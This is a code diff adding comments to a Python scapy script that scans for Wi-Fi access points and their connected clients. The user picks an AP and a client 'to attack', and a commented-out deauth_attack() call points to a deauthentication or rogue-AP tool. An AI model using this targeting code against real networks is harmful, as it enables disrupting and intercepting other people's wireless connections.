@@ -91,18 +91,23 @@ def ap_scan():
     channel_changer.daemon = True
     channel_changer.start()
     print("\n Scanning for networks...\n")
-    # Sniffing packets
+    # Sniffing packets - scanning the network for AP in the area
     sniff(iface = interface, prn = ap_scan_pkt, timeout=search_timeout)
     num_of_ap = len(ap_list)
+    # If at least one AP was found, print all the found APs
     if num_of_ap > 0: 
         # If at least 1 AP was found. 
         print("\n*************** APs Table ***************\n")
         for x in range(num_of_ap):
             print("[" + str(x) + "] - BSSID: " + ap_list[x][BSSID] + " \t Channel:" + str(ap_list[x][CHANNEL]) + " \t AP name: " + ap_list[x][ESSID]) 
         print("\n************* FINISH SCANNING *************\n")
+        # Choosing the AP to attack
         ap_index = int(input("Please enter the number of the AP you want to attack: "))
+        # Print the choosen AP
         print("You choose the AP: [" + str(ap_index) + "] - BSSID: " + ap_list[ap_index][BSSID] + " Channel:" + str(ap_list[ap_index][CHANNEL]) + " AP name: " + ap_list[ap_index][ESSID])
+        # Set the channel as the choosen AP channel in order to send packets to connected clients later
         set_channel(int(ap_list[ap_index][CHANNEL]))
+        # Save all the needed information about the choosen AP
         global ap_mac
         global ap_name
         global ap_channel
@@ -190,27 +195,34 @@ def client_scan_rap():
 ### In this fucntion we scan the network for clients who are connected to the choosen AP. 
 ### We present to the user all the clients that were found, and he choose which client he want to attack. 
 def client_scan():
+    # We need the client to send packet to the AP and it may take time, so we double the scan time
     s_timeout = search_timeout * 2
     print(G + "\nScanning for clients that connected to: " + ap_name + " ...")
     channel_changer = Thread(target=change_channel)
+    # A daemon thread runs without blocking the main program from exiting
     channel_changer.daemon = True
     channel_changer.start()
+    # Sniffing packets - scanning the network for clients which are connected to the choosen AP 
     sniff(iface=interface, prn=client_scan_pkt, timeout=s_timeout)
     num_of_client = len(client_list)
+    # If at least one client was found, print all the found clients
     if num_of_client > 0: 
         # If at least 1 client was found. 
         print("\n*************** Clients Table ***************\n")
         for x in range(num_of_client):
             print("[" + str(x) + "] - "+ client_list[x])
         print("\n************** FINISH SCANNING **************\n")
+        # Choosing the AP to attack
         client_index = input("Please enter the number of the client you want to attack or enter 'R' if you want to rescan: ")
         if client_index == 'R': 
             # Rescan
             client_scan()
         elif client_index.isnumeric():
             # Client was choosen
+            # Print the choosen AP
             print("You choose the client: [" + client_index + "] - "+ client_list[int(client_index)])
             global client_mac
+            # Save the needed information about the choosen client
             client_mac = client_list[int(client_index)]
             # deauth_attack()
     else: 
@@ -227,9 +239,12 @@ def client_scan():
 ### Same as 'ap_scan_pkt()' but for the clients. 
 def client_scan_pkt(pkt):
     global client_list
+    # We are interested in packets that send from/to the choosen AP to/from a single client (not broadcast)
+    # ff:ff:ff:ff:ff:ff - broadcast address 
     if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
         if pkt.addr1 not in client_list:
             if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
+                # Add the new found client to the client list
                 client_list.append(pkt.addr1)
                 print("Client with MAC address: " + pkt.addr1 + " was found.")
 
